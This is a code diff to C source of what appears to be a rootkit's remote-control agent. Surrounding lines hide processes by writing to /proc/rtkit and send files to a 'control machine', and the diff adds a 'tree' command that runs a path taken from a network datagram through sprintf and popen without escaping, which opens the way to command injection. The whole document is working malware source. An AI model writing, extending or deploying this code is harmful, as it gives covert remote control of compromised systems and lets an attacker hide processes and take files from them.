@@ -57,7 +57,7 @@ void sendOnline() {
 
 void initRemote() {
     int pid = getpid();
-    char command[512];
+    char command[256];
     FILE *fp;
 
     // Hidden process
@@ -75,7 +75,7 @@ void initRemote() {
 int main(int argc, char const *argv[]) {
     int x, z, ret, filelen;
     char *control_ip = "127.0.0.1";
-    char hidepid[8], command[64], path[128], filename[256];
+    char hidepid[8], command[256], path[128], filename[256];
     char eof[10] = "___EOF___\n";
     pthread_t thread;
 
@@ -141,6 +141,17 @@ int main(int argc, char const *argv[]) {
             sscanf(datagram, "%*5s%s", hidepid);
             sprintf(command, "echo -n hp%s > /proc/rtkit", hidepid);
             bzero(hidepid, sizeof(hidepid));
+            fp = popen(command, "r");
+        }
+        // Show the nesting of  sub-directories
+        else if (strcmp(command, "tree") == 0) {
+            bzero(command, sizeof(command));
+            sscanf(datagram, "%*5s%s", path);
+            sprintf(command, "cd %s\npwd\n\
+                              ls -R | grep \":$\" | sed -e 's/:$//' -e 's/[^-][^\\/]*\\//--/g' -e 's/^/   /' -e 's/-/|/'\n\
+                              [ `ls -F -1 | grep \"/\" | wc -l` = 0 ] && echo \"   -> no sub-directories\"", path);
+            bzero(path, sizeof(path));
+            command[strlen(command) - 1] = 0;
             fp = popen(command, "r");
         }
         // Transfer file to the control machine
